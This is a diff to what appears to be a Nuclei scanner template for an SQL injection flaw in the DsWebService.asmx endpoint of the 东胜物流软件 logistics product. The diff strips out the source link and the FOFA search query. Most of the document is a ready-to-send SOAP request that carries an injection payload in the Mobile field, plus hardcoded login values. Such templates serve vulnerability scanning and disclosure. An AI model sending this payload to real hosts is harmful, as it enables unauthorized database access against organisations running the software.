@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件 DsWebService.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hq7ahrv5kf78t886'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hq7ahrv5kf78t886
-    fofa: app="东胜物流软件-物流软件"
 http:
 - raw:
   - "POST /Webservice/DsWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: close\nContent-Type: application/soap+xml;charset=UTF-8;action=\"DsWebService/GetSeaiBsDataList\"\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:dsw=\"DsWebService\">\n   <soap:Header/>\n   <soap:Body>\n      <dsw:GetSeaiBsDataList>\n         <!--Optional:-->\n         <dsw:LoginName>qdtaize</dsw:LoginName>\n         <!--Optional:-->\n         <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>\n         <!--Optional:-->\n         <dsw:Mobile>1') or 1=@@VERSION--</dsw:Mobile>\n         <!--Optional:-->\n         <dsw:Mblno>1</dsw:Mblno>\n         <dsw:start>1</dsw:start>\n         <dsw:limit>1</dsw:limit>\n      </dsw:GetSeaiBsDataList>\n   </soap:Body>\n</soap:Envelope>"
